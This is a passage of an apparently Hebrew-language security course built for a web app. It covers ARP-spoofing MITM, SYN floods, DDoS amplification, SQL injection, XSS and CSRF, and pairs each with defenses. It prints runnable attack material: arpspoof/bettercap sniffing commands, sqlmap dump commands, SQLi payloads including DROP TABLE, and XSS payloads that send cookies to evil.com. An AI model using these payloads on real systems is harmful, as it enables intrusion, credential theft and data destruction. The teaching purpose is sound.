<div class="vs-card vs-good"><h4>✅ ARP רגיל</h4><p>Victim שואל: "מי הוא 192.168.1.1?"<br/>Gateway עונה בכנות עם ה-MAC האמיתי שלו.<br/>התקשורת זורמת ישירות.</p></div>
<div class="vs-card vs-bad"><h4>❌ ARP Spoofing</h4><p>התוקף עונה: "אני 192.168.1.1!" עם ה-MAC שלו.<br/>Victim מעדכן טבלה — כל התעבורה עוברת דרך התוקף.<br/>MITM מלא.</p></div>
</div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> התוקף לא "פרץ" שום דבר. הוא פשוט ניצל את העובדה שפרוטוקול ARP מאמין לכל תשובה ללא אימות. זו חולשה <strong>by design</strong>.</div>
</div>`
      },
      {
        type: "demo",
        title: "MITM בפעולה — כלים ופלט",
        content: `<div dir="rtl">
<p><strong>הנה איך התקפת MITM נראית מצד התוקף.</strong></p>
<div class="demo-note">⚠️ הדגמה למטרות לימודיות בלבד. ביצוע על רשת ללא הרשאה הוא עבירה פלילית.</div>

<div class="tool-card">
<div class="tool-card-icon">🔍</div>
<div class="tool-card-body"><strong>Nmap</strong><p>סורק רשתות — מגלה מכשירים, ports פתוחים, גרסאות שירותים, ומערכות הפעלה.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">☠️</div>
<div class="tool-card-body"><strong>arpspoof</strong><p>כלי מ-dsniff suite — שולח ARP replies מזויפים כדי להפנות תעבורה דרך התוקף.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🐙</div>
<div class="tool-card-body"><strong>Bettercap</strong><p>Swiss army knife למתקפות רשת — ARP spoofing, sniffing, DNS spoofing, HTTP proxy ועוד.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🦈</div>
<div class="tool-card-body"><strong>Wireshark</strong><p>מנתח פרוטוקולים — לכידה וניתוח ויזואלי של כל packet ברשת.</p></div>
</div>

<p><strong>שלב 1: סריקת הרשת — מי כאן?</strong></p>
<div class="code-preview"><pre><code># גילוי כל המכשירים ברשת המקומית
$ sudo nmap -sn 192.168.1.0/24

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1      ← Gateway
Host is up (0.003s latency).
MAC Address: AA:BB:CC:11:22:33 (TP-Link)

Nmap scan report for 192.168.1.5      ← הקורבן
Host is up (0.008s latency).
MAC Address: DD:EE:FF:44:55:66 (Apple)

Nmap scan report for 192.168.1.99     ← אנחנו (התוקף)
Host is up.</code></pre></div>

<p><strong>שלב 2: הפעלת ARP Spoofing</strong></p>
<div class="code-preview"><pre><code># הפעלת IP forwarding — כדי לא לנתק את הקורבן
$ echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof: הגד לקורבן שאנחנו ה-Gateway
$ sudo arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
0:11:22:33:44:55 dd:ee:ff:44:55:66 0806 42:
  arp reply 192.168.1.1 is-at 0:11:22:33:44:55
0:11:22:33:44:55 dd:ee:ff:44:55:66 0806 42:
  arp reply 192.168.1.1 is-at 0:11:22:33:44:55
...

# בטרמינל שני: הגד ל-Gateway שאנחנו הקורבן
$ sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5</code></pre></div>

<p><strong>שלב 3: צפייה בתעבורה</strong></p>
<div class="code-preview"><pre><code># כלי מתקדם יותר: bettercap
$ sudo bettercap -iface wlan0

» net.probe on
» net.sniff on
» set arp.spoof.targets 192.168.1.5
» arp.spoof on

[12:34:56] [net.sniff.http.request] GET http://example.com/login
           Cookie: session_id=abc123def456
[12:34:57] [net.sniff.http.request] POST http://old-site.com/api/auth
           body: username=john&password=MyP@ss123</code></pre></div>

<div class="warning-box"><strong>⚠️ שים לב:</strong> אתרים עם <code>HTTPS</code> מוצפנים — התוקף רואה רק את ה-domain (SNI), לא את התוכן. לכן <code>HTTPS Everywhere</code> כל כך חשוב. אבל אתרים ישנים ב-HTTP, בקשות DNS, ותעבורה לא מוצפנת — חשופים לחלוטין.</div>

<p><strong>הגנות מפני ARP Spoofing:</strong></p>
<ul>
<li><code>Dynamic ARP Inspection</code> (DAI) — ב-managed switches, מאמת ARP replies מול טבלת DHCP</li>
<li><code>Static ARP entries</code> — הגדרה ידנית של ה-Gateway (לא מעשי ברשתות גדולות)</li>
<li><code>802.1X</code> — אימות ברמת ה-port</li>
<li><code>VPN</code> — מצפין הכל, גם אם יש MITM, התוקף רואה רק "שטויות" מוצפנות</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "SYN Flood — כשלחיצת יד הורסת שרת",
        content: `<div dir="rtl">
<div class="info-box"><strong>ℹ️ האנלוגיה:</strong> דמיין מסעדה עם 100 שולחנות. מישהו מתקשר 100 פעמים ומזמין שולחן בשם שונה כל פעם. ואז לא מגיע. כל השולחנות שמורים — ואף לקוח אמיתי לא יכול לשבת. זה בדיוק מה ש-<code>SYN Flood</code> עושה ל-TCP.</div>

<p><strong>תזכורת — TCP Three-Way Handshake:</strong></p>
<div class="code-preview"><pre><code>  Client              Server
    │                    │
    │──── SYN ──────────→│  "היי, אני רוצה להתחבר"
    │                    │  Server: מקצה זיכרון (TCB), שומר state
    │←─── SYN-ACK ──────│  "בסדר, אני מוכן"
    │                    │
    │──── ACK ──────────→│  "מעולה, מתחילים"
    │                    │  ← חיבור הושלם!</code></pre></div>

<p><strong>במתקפת SYN Flood:</strong></p>
<div class="code-preview"><pre><code>  Attacker (IP מזויף)     Server
    │──── SYN ───────────→│  שמור state #1 (60s timeout)
    │──── SYN ───────────→│  שמור state #2
    │──── SYN ───────────→│  שמור state #3
    │     ... x1,000,000  │
    │                      │  ← Backlog queue מלא!
    │                      │  ← SYN-ACK נשלח ל-IP מזויף
    │                      │     (שלעולם לא יגיב)
    │                      │
  Real User                │
    │──── SYN ──────────X│  ← נדחה! אין מקום ב-queue</code></pre></div>

<p><strong>למה זה עובד?</strong></p>
<ul>
<li>השרת <strong>חייב</strong> להקצות זיכרון (<code>TCB</code>) לכל <code>SYN</code> — זה חלק מהפרוטוקול</li>
<li>ה-timeout לכל half-open connection הוא <strong>60 שניות</strong> בברירת מחדל <div class="stat-highlight" style="display:inline-flex;margin:4px 8px;"><span class="stat-number">60s</span><span class="stat-unit">timeout ברירת מחדל</span></div></li>
<li>התוקף משתמש ב-<code>IP spoofing</code> — אז ה-<code>SYN-ACK</code> נשלח למישהו שלא ביקש</li>
<li>היחס: תוקף שולח MB, שרת סופג GB של state</li>
</ul>

<div class="key-point"><strong>💡 הפתרון — SYN Cookies:</strong> במקום לשמור state בזיכרון, השרת מקודד את כל המידע הנחוץ בתוך ה-<code>ISN</code> (Initial Sequence Number) של ה-SYN-ACK. רק כשמגיע ACK אמיתי (שמוכיח שה-IP אמיתי) — השרת משחזר את ה-state ומקצה זיכרון.</div>
</div>`
      },
      {
        type: "story",
        title: "3.47 Tbps — ה-DDoS הגדול בהיסטוריה",
        content: `<div dir="rtl">
<p><strong>ינואר 2022. מרכז הבקרה של Microsoft Azure, רדמונד.</strong></p>

<p>השעה 09:15 UTC. מהנדסת רשת בכירה רואה את הגרף קופץ. לא קצת — <strong>מזנק</strong>. תוך שניות, 3.47 <code>Terabits</code> לשנייה של תעבורה זדונית ממוקדים בלקוח אחד של Azure באסיה.</p>

<p>לשים את זה בפרופורציה: 3.47 Tbps זה בערך כל תעבורת האינטרנט של ישראל כולה, מרוכזת על שרת אחד.</p>

<p><strong>המספרים מדהימים:</strong></p>
<div style="display:flex;gap:12px;flex-wrap:wrap;margin:12px 0;">
<div class="stat-highlight"><span class="stat-number">3.47 Tbps</span><span class="stat-unit">שיא עולמי — bandwidth</span></div>
<div class="stat-highlight"><span class="stat-number">340M</span><span class="stat-unit">packets לשנייה</span></div>
<div class="stat-highlight"><span class="stat-number">10,000</span><span class="stat-unit">מקורות ב-10 מדינות</span></div>
<div class="stat-highlight"><span class="stat-number">15 דקות</span><span class="stat-unit">משך המתקפה</span></div>
</div>

<div class="incident-timeline">
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">09:15 UTC</div><div class="timeline-desc">גרף התעבורה מזנק — מהנדסת רשת בכירה מזהה אנומליה</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">09:15:03</div><div class="timeline-desc">3.47 Tbps של UDP reflection ממוקדים בלקוח אחד באסיה</div></div>
<div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">09:15:08</div><div class="timeline-desc">Azure DDoS Protection מזהה ומתחיל סינון אוטומטי ב-60+ scrubbing centers</div></div>
<div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">09:30</div><div class="timeline-desc">המתקפה נגמרת — הלקוח כמעט לא הרגיש</div></div>
</div>

<p><strong>הטכניקה: UDP Reflection + Amplification</strong></p>
<p>התוקפים לא שלחו 3.47 Tbps בעצמם — זה בלתי אפשרי. הם ניצלו <code>amplification</code>:</p>

<div class="code-preview"><pre><code># כך עובדת Amplification Attack:

1. תוקף שולח בקשת DNS קטנה (40 bytes)
   מזייף את כתובת השולח → כתובת הקורבן

2. שרת DNS ציבורי מקבל את הבקשה
   מחזיר תשובה ענקית (3,000 bytes)
   ← שולח לכתובת ה"שולח" = הקורבן!

3. פקטור הגברה: x75 (40 → 3,000 bytes)

# פרוטוקולים שמנוצלים:
# CLDAP:  x56-70
# DNS:    x28-54
# NTP:    x556 (!!)
# memcached: x51,000 (!!!)</code></pre></div>

<p><strong>מה Azure עשו?</strong></p>
<p>שירות <code>Azure DDoS Protection</code> פועל בשכבת הקצה (<code>network edge</code>) — מרכזי סינון (<code>scrubbing centers</code>) ב-60+ מיקומים בעולם. המערכת זיהתה את המתקפה תוך שניות והתחילה לסנן תעבורה זדונית <strong>לפני שהגיעה לשרת הלקוח</strong>.</p>

<p>הלקוח? כמעט לא הרגיש.</p>

<div class="key-point"><strong>💡 הלקח:</strong> מפני DDoS אי אפשר להתגונן לבד. אין שרת בעולם שמחזיק 3.47 Tbps. הפתרון היחיד: תשתית מבוזרת לסינון — <code>Cloudflare</code>, <code>Azure DDoS Protection</code>, <code>AWS Shield</code>. אם אתה לא משתמש בשירות כזה — אתה חשוף.</div>
</div>`
      },
      {
        type: "explanation",
        title: "הגנה — SYN Cookies, Rate Limiting, CDN",
        content: `<div dir="rtl">
<p><strong>הכרנו את ההתקפות. עכשיו — איך מתגוננים?</strong></p>

<p><strong>1. SYN Cookies — הגנה מפני SYN Flood</strong></p>
<div class="code-preview"><pre><code># בדיקה ב-Linux — האם SYN Cookies מופעלים?
$ sysctl net.ipv4.tcp_syncookies
net.ipv4.tcp_syncookies = 1    ← מופעל (ברירת מחדל)

# הקטנת timeout ל-half-open connections
$ sysctl net.ipv4.tcp_synack_retries
net.ipv4.tcp_synack_retries = 5   ← ברירת מחדל (320s!)
# הורד ל-2 (24 שניות) — מספיק ללגיטימיים

# הגדלת backlog queue
$ sysctl net.ipv4.tcp_max_syn_backlog
# ברירת מחדל: 256-1024. הגדל ל-65536 בשרתים</code></pre></div>

<p><strong>2. Rate Limiting — הגבלת קצב</strong></p>
<div class="code-preview"><pre><code># iptables: מגביל SYN חדשים ל-100/שנייה
$ iptables -A INPUT -p tcp --syn \\
    -m limit --limit 100/s --limit-burst 200 \\
    -j ACCEPT
$ iptables -A INPUT -p tcp --syn -j DROP

# nginx: rate limiting per IP
limit_req_zone $binary_remote_addr
    zone=api:10m rate=10r/s;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
    }
}</code></pre></div>

<p><strong>3. CDN / Anycast — הגנה מפני DDoS</strong></p>
<p>ה-CDN מפזר את התעבורה על מאות שרתים ברחבי העולם. במקום שכל התעבורה תגיע לשרת אחד — כל אזור גיאוגרפי מקבל רק את התעבורה המקומית.</p>

<table class="content-table">
  <tr><th>שירות</th><th>תמחור</th><th>יכולת סינון</th></tr>
  <tr><td><code>Cloudflare</code></td><td>חינם (בסיסי) / $20+</td><td>עד 100+ Tbps</td></tr>
  <tr><td><code>AWS Shield</code></td><td>$3,000/חודש (Advanced)</td><td>אוטומטי ל-AWS</td></tr>
  <tr><td><code>Azure DDoS</code></td><td>$2,944/חודש</td><td>3.47 Tbps+ (מוכח)</td></tr>
  <tr><td><code>Akamai</code></td><td>Enterprise</td><td>מהגדולים בעולם</td></tr>
</table>

<p><strong>4. הגנה מפני ARP Spoofing</strong></p>
<ul>
<li><code>Dynamic ARP Inspection</code> (DAI) — ב-managed switches, מאמת ARP מול DHCP snooping</li>
<li><code>802.1X Port Authentication</code> — כל מכשיר חייב להזדהות לפני שמקבל גישה לרשת</li>
<li><code>VPN</code> — אפילו ב-WiFi ציבורי, VPN מצפין הכל. התוקף רואה רק gibberish</li>
</ul>

<div class="success-box"><strong>✅ SYN Cookies:</strong> במקום לשמור state בזיכרון, מקודד את המידע ב-ISN. רק ACK אמיתי מקצה משאבים.</div>
<div class="success-box"><strong>✅ Rate Limiting:</strong> הגבלת קצב SYN חדשים ל-IP — מונע הצפה ממקור בודד.</div>
<div class="success-box"><strong>✅ CDN/Anycast:</strong> מפזר תעבורה על מאות שרתים בעולם — DDoS נספג בשכבת הקצה.</div>
<div class="success-box"><strong>✅ DAI + 802.1X:</strong> מאמת ARP replies מול DHCP snooping — מונע ARP Spoofing ברשת מנוהלת.</div>

<div class="attack-chain defense-chain">
<div class="attack-step"><div class="attack-step-content"><strong>שכבה 1: Network Edge</strong><p>CDN + Anycast + DDoS Protection (Cloudflare, AWS Shield)</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>שכבה 2: Network Perimeter</strong><p>SYN Cookies + Rate Limiting + iptables rules</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>שכבה 3: Local Network</strong><p>DAI + 802.1X + VPN + Static ARP entries</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>שכבה 4: Monitoring</strong><p>SIEM alerts + traffic analysis + anomaly detection</p></div></div>
</div>

<div class="key-point"><strong>💡 סיכום:</strong> ההגנה הטובה ביותר היא <strong>שכבות</strong> — SYN Cookies + Rate Limiting + CDN + Monitoring. אין פתרון קסם אחד.</div>

<div class="chapter-summary"><h4>📋 סיכום פרק 102</h4><ul>
<li><strong>ARP Spoofing</strong> — ניצול חוסר אימות בפרוטוקול ARP ל-MITM. הגנה: DAI, 802.1X, VPN</li>
<li><strong>SYN Flood</strong> — הצפת שרת ב-half-open connections. הגנה: SYN Cookies, Rate Limiting</li>
<li><strong>DDoS</strong> — Amplification attacks שמגיעים ל-Terabits. הגנה: CDN/Anycast (Cloudflare, AWS Shield)</li>
<li>הגנה בשכבות היא המפתח — אין פתרון יחיד שעוצר הכל</li>
</ul></div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – אם יכולת לראות הכל",
        intro: "<p>מתקפות רשת חושפות שאלות מעניינות על פרטיות, אבטחה, והאופי של האינטרנט...</p>",
        blocks: [
          {
            title: "אם יכולת לראות את כל התעבורה ברשת...",
            icon: "👁️",
            content: "סוכנויות ביון רואות חלק גדול מתעבורת האינטרנט העולמית (ראה: Snowden 2013, תוכנית PRISM). השאלה: האם ניטור המוני מוצדק אם הוא מונע פיגועים? הבעיה: אותם כלים שמאפשרים לממשלה לעקוב אחרי טרוריסטים — מאפשרים גם לעקוב אחרי עיתונאים, פעילים, ואזרחים רגילים. איפה הגבול?"
          },
          {
            title: "הפרדוקס של ה-Honeypot",
            icon: "🍯",
            content: "Honeypot הוא שרת מזויף שמטרתו למשוך תוקפים כדי ללמוד את הטכניקות שלהם. אבל מה אם תוקף מזהה שזה honeypot — ומשתמש בו כדי להזין אותך במידע שגוי? ומה אם התוקף משתמש ב-honeypot שלך כבסיס לתקוף אחרים? האם אתה אחראי? זו דילמה אמיתית שצוותי אבטחה מתמודדים איתה."
          },
          {
            title: "מבחן מחשבה: DDoS כמחאה",
            icon: "📢",
            content: "קבוצת Anonymous ביצעה DDoS על אתרי ממשלות כמחאה פוליטית. הם טענו שזו 'הפגנה דיגיטלית' — כמו חסימת כביש. בתי משפט קבעו שזו עבירה פלילית. מה דעתך? האם יש הבדל מוסרי בין חסימת כביש פיזית לבין DDoS? שניהם מונעים גישה, שניהם זמניים, שניהם פוגעים באחרים."
          },
          {
            title: "העתיד: Quantum Networking",
            icon: "🔮",
            content: "תקשורת קוונטית (QKD — Quantum Key Distribution) מאפשרת לזהות MITM פיזיקלית. כל ניסיון להאזין לתקשורת קוונטית משנה את הקיוביטים באופן שנמדד. סין כבר הפעילה לוויין QKD (Micius) ורשת קרקעית של 2,000 ק\"מ. אם הטכנולוגיה הזו תתפשט — ARP Spoofing ו-MITM יהפכו לנחלת העבר."
          }
        ]
      }
    ]
  },

  // ========== CHAPTER 103: OWASP Top 10 ==========
  {
    id: 103,
    title: "OWASP Top 10 — פגיעויות Web",
    pages: [
      {
        type: "story",
        title: "הנער שפרץ לבנק — סיפור אמיתי",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
<p><strong>תרחיש:</strong> 2015, מדינה באירופה. נער בן 17 עם Burp Suite ושאלה סקרנית — האם אתר הבנק באמת מאובטח?</p>
</div>

<p><strong>2015, מדינה באירופה. נער בן 17.</strong></p>

<p>הוא לא האקר מנוסה. הוא סתם תלמיד שמשחק עם <code>Burp Suite</code> שהוריד אתמול. הוא גולש באתר של הבנק המקומי שלו — לא כדי לפרוץ, סתם סקרנות.</p>

<p>הוא מגלה דף חיפוש. מקליד בשדה החיפוש:</p>
<div class="code-preview"><pre><code>' OR '1'='1</code></pre></div>

<p>ואז קורה משהו שהוא לא ציפה לו: <strong>הדף מחזיר רשימה של כל הלקוחות בבנק.</strong> שמות, כתובות, מספרי חשבון.</p>

<p>הלב שלו דופק. הוא מבין שזה <code>SQL Injection</code> — פגיעות שקרא עליה ב-tutorial. האתר של בנק אמיתי, שמנהל מיליארדי יורו, פגיע לתקיפה הכי בסיסית בספר.</p>

<p>הוא עושה את הדבר הנכון: סוגר את הדפדפן ושולח מייל לבנק. <code>Responsible Disclosure</code>.</p>

<p>הבנק? <strong>מגיש נגדו תלונה במשטרה.</strong></p>

<div class="warning-box"><strong>⚠️ מציאות מרה:</strong> גם כשמדווחים באחריות, חברות לפעמים תוקפות את המגלה במקום לתקן את הבעיה. לכן קיימות פלטפורמות כמו <code>HackerOne</code> ו-<code>Bugcrowd</code> — שנותנות מסגרת חוקית לגילוי אחראי.</div>

<p>הסיפור הזה — עם וריאציות — חוזר על עצמו שוב ושוב. פגיעויות Web בסיסיות שנמצאות באתרים של בנקים, ממשלות, ובתי חולים.</p>

<p>בפרק הזה נלמד את הפגיעויות הנפוצות ביותר: <code>SQL Injection</code>, <code>XSS</code>, <code>CSRF</code>, ואת רשימת <code>OWASP Top 10</code> המלאה.</p>
</div>`
      },
      {
        type: "demo",
        title: "SQL Injection — מההתקפה להגנה",
        content: `<div dir="rtl">
<p><strong>SQL Injection היא הפגיעות #1 כבר 20 שנה. בואו נראה למה.</strong></p>

<p><strong>הקוד הפגיע:</strong></p>
<div class="code-preview"><pre><code>// Node.js — קוד פגיע (NEVER DO THIS!)
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const query = "SELECT * FROM users WHERE email='"
    + email + "' AND password='" + password + "'";
  db.query(query);
});</code></pre></div>

<p><strong>המתקפה:</strong></p>
<div class="code-preview"><pre><code>// תוקף מזין בשדה email:
admin@bank.com'--

// ובשדה password:
anything

// ה-SQL שנוצר:
SELECT * FROM users
  WHERE email='admin@bank.com'--' AND password='anything'
                               ↑
                     כל מה שאחרי -- הוא comment!

// = SELECT * FROM users WHERE email='admin@bank.com'
// → מחזיר את ה-admin ללא סיסמה!</code></pre></div>

<p><strong>מתקפות מתקדמות יותר:</strong></p>
<div class="code-preview"><pre><code>// 1. UNION Attack — שליפת טבלאות אחרות
' UNION SELECT username, password FROM admin_users--

// 2. Blind Boolean — שאלות כן/לא
' AND (SELECT LENGTH(password) FROM users
       WHERE email='admin@bank.com') > 10--
// אם הדף נטען רגיל = true, אם שגיאה = false

// 3. Time-Based Blind — מדידת זמן
'; IF(1=1) WAITFOR DELAY '00:00:05'--
// אם עיכוב 5 שניות = הפגיעות קיימת

// 4. Stacked Queries — הרס מוחלט
'; DROP TABLE users;--</code></pre></div>

<p><strong>ההגנה — Parameterized Queries:</strong></p>
<div class="code-preview"><pre><code>// ✅ הדרך הנכונה — Node.js
const query = "SELECT * FROM users WHERE email = $1 AND password = $2";
db.query(query, [email, hashedPassword]);

// ✅ Python + SQLAlchemy (ORM)
user = session.query(User).filter_by(
    email=email, password=hashed_pw
).first()

// ✅ Java PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE email=? AND password=?");
ps.setString(1, email);
ps.setString(2, hashedPassword);</code></pre></div>

<div class="vs-container">
<div class="vs-card vs-bad"><h4>❌ קוד פגיע</h4><p><code>const query = "SELECT * FROM users WHERE email='" + email + "'";</code><br/>קלט משתמש מוזרק ישירות ל-SQL — מאפשר SQL Injection.</p></div>
<div class="vs-card vs-good"><h4>✅ Parameterized Query</h4><p><code>db.query("SELECT * FROM users WHERE email = $1", [email]);</code><br/>הקלט מופרד מהשאילתא — אי אפשר להזריק קוד.</p></div>
</div>

<div class="key-point"><strong>💡 עיקרון:</strong> <strong>לעולם</strong> אל תשלב קלט משתמש ישירות ב-SQL. השתמש ב-<code>Parameterized Queries</code> או <code>ORM</code>. זו ההגנה היחידה האמיתית.</div>
</div>`
      },
      {
        type: "explanation",
        title: "SQLi — כלים אוטומטיים והגנה מעמיקה",
        content: `<div dir="rtl">
<div class="tool-card">
<div class="tool-card-icon">🗡️</div>
<div class="tool-card-body"><strong>sqlmap</strong><p>כלי אוטומטי לזיהוי וניצול SQL Injection. תומך ב-MySQL, PostgreSQL, MSSQL, Oracle ועוד. יכול לשלוף מסדי נתונים שלמים.</p></div>
</div>

<p><strong><code>sqlmap</code> — כלי שהופך SQL Injection לאוטומטי</strong></p>
<div class="code-preview"><pre><code># סריקה בסיסית — בודק אם URL פגיע
$ sqlmap -u "https://target.com/search?q=test" --batch

# שליפת כל מסדי הנתונים
$ sqlmap -u "https://target.com/search?q=test" --dbs
available databases:
[*] production_db
[*] admin_panel
[*] information_schema

# שליפת טבלאות
$ sqlmap -u "..." -D production_db --tables
[*] users
[*] orders
[*] credit_cards    ← אוי.

# שליפת נתונים
$ sqlmap -u "..." -D production_db -T users --dump</code></pre></div>

<p><strong>הגנה רב-שכבתית מפני SQLi:</strong></p>
<table class="content-table">
  <tr><th>שכבה</th><th>הגנה</th><th>למה צריך</th></tr>
  <tr><td>1. קוד</td><td><code>Parameterized Queries</code> / <code>ORM</code></td><td>מונע את ההזרקה עצמה</td></tr>
  <tr><td>2. Validation</td><td><code>Input validation</code> + <code>whitelist</code></td><td>סינון תווים חשודים (' " ; --)</td></tr>
  <tr><td>3. הרשאות</td><td><code>Least Privilege</code> ב-DB user</td><td>אפילו אם פרצו — אין DROP TABLE</td></tr>
  <tr><td>4. WAF</td><td><code>Web Application Firewall</code></td><td>מזהה וחוסם patterns של SQLi</td></tr>
  <tr><td>5. Monitoring</td><td><code>Query logging</code> + alerts</td><td>מזהה ניסיונות בזמן אמת</td></tr>
</table>

<div class="success-box"><strong>✅ הגנה מספר 1:</strong> השתמש תמיד ב-<code>Parameterized Queries</code> או <code>ORM</code>. זה מונע את ההזרקה ברמת השפה — לא משנה מה התוקף מנסה.</div>

<div class="warning-box"><strong>⚠️ טעות נפוצה:</strong> הרבה מפתחים חושבים ש-<code>escaping</code> (החלפת ' ב-\') מספיק. זה <strong>לא מספיק</strong>. יש עשרות דרכים לעקוף escaping. <code>Parameterized Queries</code> הוא הפתרון היחיד המהימן.</div>
</div>`
      },
      {
        type: "demo",
        title: "XSS — כשהדפדפן הוא הנשק",
        content: `<div dir="rtl">
<p><strong>XSS — Cross-Site Scripting: הזרקת JavaScript לדפדפן של הקורבן.</strong></p>

<p>שלושה סוגים: <span class="phase-badge phase-red">Reflected XSS</span> <span class="phase-badge phase-gold">Stored XSS</span> <span class="phase-badge phase-blue">DOM-Based XSS</span></p>

<p><strong>Reflected XSS — חוזר ב-URL:</strong></p>
<div class="code-preview"><pre><code>// אתר עם שדה חיפוש שמציג את מה שחיפשת:
// https://shop.com/search?q=נעליים
// הדף מציג: "חיפשת: נעליים"

// מה אם נכניס JavaScript?
https://shop.com/search?q=<script>
  fetch('https://evil.com/steal?cookie='
    + document.cookie)
</script>

// אם האתר לא מסנן — הדפדפן מריץ את הסקריפט!
// ← הcookie של הקורבן נשלח לתוקף</code></pre></div>

<p><strong>Stored XSS — הכי מסוכן:</strong></p>
<div class="code-preview"><pre><code>// תוקף מפרסם תגובה בפורום:
<img src=x onerror="
  fetch('https://evil.com/steal?c='
    + btoa(document.cookie))
">

// התגובה נשמרת ב-DB
// כל מי שנכנס לדף — הסקריפט רץ אוטומטית
// מאות/אלפי קורבנות מתגובה אחת!</code></pre></div>

<p><strong>DOM-Based XSS — הכל בצד הלקוח:</strong></p>
<div class="code-preview"><pre><code>// קוד פגיע ב-JavaScript:
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML =
  'שלום ' + name;

// URL זדוני:
?name=<img src=x onerror=alert(document.cookie)>

// ← הHTML מוזרק ישירות ל-DOM</code></pre></div>

<p><strong>הגנות מפני XSS:</strong></p>
<div class="code-preview"><pre><code>// 1. HTML Escaping — הכרחי!
&  →  &amp;
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;

// 2. Content Security Policy (CSP)
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  // ← רק סקריפטים עם nonce תואם ירוצו!

// 3. HttpOnly Cookies
Set-Cookie: session=abc123; HttpOnly; Secure
// ← JavaScript לא יכול לקרוא את ה-cookie

// 4. React/Vue/Angular — auto-escape by default
// ← אבל אם תשתמש ב-dangerouslySetInnerHTML...💀</code></pre></div>

<div class="vs-container">
<div class="vs-card vs-bad"><h4>❌ XSS פגיע</h4><p><code>document.getElementById('out').innerHTML = userInput;</code><br/>קלט משתמש מוזרק ישירות ל-DOM ללא סינון.</p></div>
<div class="vs-card vs-good"><h4>✅ Escaped Output</h4><p><code>document.getElementById('out').textContent = userInput;</code><br/><code>textContent</code> מציג טקסט בלבד — לא מריץ HTML/JS.</p></div>
</div>
</div>`
      },
      {
        type: "explanation",
        title: "CSRF — העברה בנקאית שלא ביצעת",
        content: `<div dir="rtl">
<p><strong>התרחיש:</strong> אתה מחובר לאתר הבנק שלך. בטאב אחר, אתה גולש באתר תמים (או כך חשבת).</p>

<div class="attack-chain">
<div class="attack-step"><div class="attack-step-content"><strong>1. הקורבן מחובר לבנק</strong><p>Cookie של session שמור בדפדפן — תקף ופעיל</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>2. גולש לאתר זדוני</strong><p>האתר מכיל <code>&lt;img&gt;</code> או <code>&lt;form&gt;</code> מוסתר שפונה לבנק</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>3. הדפדפן שולח Cookie</strong><p>הבקשה לבנק כוללת את ה-Cookie אוטומטית — הבנק חושב שזה הלקוח</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>4. הפעולה מתבצעת</strong><p>העברה בנקאית, שינוי סיסמה — כל פעולה שהקורבן מורשה לעשות</p></div></div>
</div>

<p>באותו אתר "תמים", מוסתר הקוד הבא:</p>
<div class="code-preview"><pre><code><!-- הדף של התוקף — נראה לגמרי רגיל -->
<h1>🐱 תמונות חתולים חמודים</h1>

<!-- מוסתר: -->
<img src="https://bank.com/transfer?to=attacker&amount=10000"
     width="0" height="0">

<!-- מה קורה? -->
<!-- הדפדפן שולח GET request ל-bank.com -->
<!-- עם ה-COOKIE שלך (כי אתה מחובר!) -->
<!-- הבנק מקבל בקשה "לגיטימית" + cookie תקין -->
<!-- ← 10,000 ש"ח הועברו לתוקף --></code></pre></div>

<p><strong>למה זה עובד?</strong></p>
<p>הדפדפן שולח <code>cookies</code> אוטומטית עם כל בקשה לאותו domain. אם אתה מחובר ל-bank.com — <strong>כל בקשה</strong> ל-bank.com תכלול את ה-cookie שלך, גם אם הבקשה הגיעה מאתר אחר.</p>

<p><strong>ההגנה — CSRF Token:</strong></p>
<div class="code-preview"><pre><code><!-- השרת שולח token ייחודי עם כל form -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token"
         value="x8f3k9m2...random...p4q7">
  <input name="to" placeholder="לחשבון">
  <input name="amount" placeholder="סכום">
  <button>העבר</button>
</form>

<!-- השרת מאמת: -->
<!-- 1. csrf_token תואם לtoken שנשמר ב-session -->
<!-- 2. אתר זדוני לא יכול לדעת את הtoken! -->
<!-- ← הבקשה מאתר אחר תידחה --></code></pre></div>

<p><strong>הגנות נוספות:</strong></p>
<ul>
<li><code>SameSite Cookie</code> — <code>Set-Cookie: session=abc; SameSite=Strict</code> — Cookie לא נשלח מאתרים אחרים</li>
<li><code>Origin / Referer header check</code> — בדיקה שהבקשה הגיעה מהדומיין שלך</li>
<li><code>Double Submit Cookie</code> — שליחת token גם ב-cookie וגם ב-header, והשוואה בצד השרת</li>
</ul>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> <code>CSRF</code> מנצל את האמון של השרת בדפדפן. <code>XSS</code> מנצל את האמון של הדפדפן בשרת. שני וקטורי תקיפה שונים — שניהם קריטיים.</div>
</div>`
      },
      {
        type: "explanation",
        title: "OWASP Top 10 — 2021",
        content: `<div dir="rtl">
<p><strong>OWASP (Open Worldwide Application Security Project) מפרסמת כל כמה שנים את 10 הסיכונים הנפוצים ביותר.</strong></p>
<p>הרשימה של 2021 היא המדריך המוביל לאבטחת אפליקציות Web:</p>

